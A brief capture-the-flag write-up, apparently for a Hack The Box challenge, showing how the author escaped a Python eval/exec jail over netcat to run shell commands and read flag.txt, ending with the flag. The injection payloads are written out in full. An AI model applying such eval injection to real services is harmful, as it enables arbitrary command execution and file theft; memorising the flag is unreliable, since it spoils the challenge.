# nehebkaus-trap

**SOLVED**

> In search of the ancient relic, you go looking for the Pharaoh's tomb inside the pyramids. 
> A giant granite block falls and blocks your exit, and the walls start closing in! 
> You are trapped. 
> Can you make it out alive and continue your quest?

`nc 142.93.38.14 32019`

```py
eval() # nice we have commands

print(str(eval(input())))
"exec('import os; print(os.getcwd())')"

exec(input())
# import os; print(os.getcwd())

exec(input())
# import os; print(os.system('ls'))

exec(input())
# import os; print(os.system('cat flag.txt'))
```

`HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}`
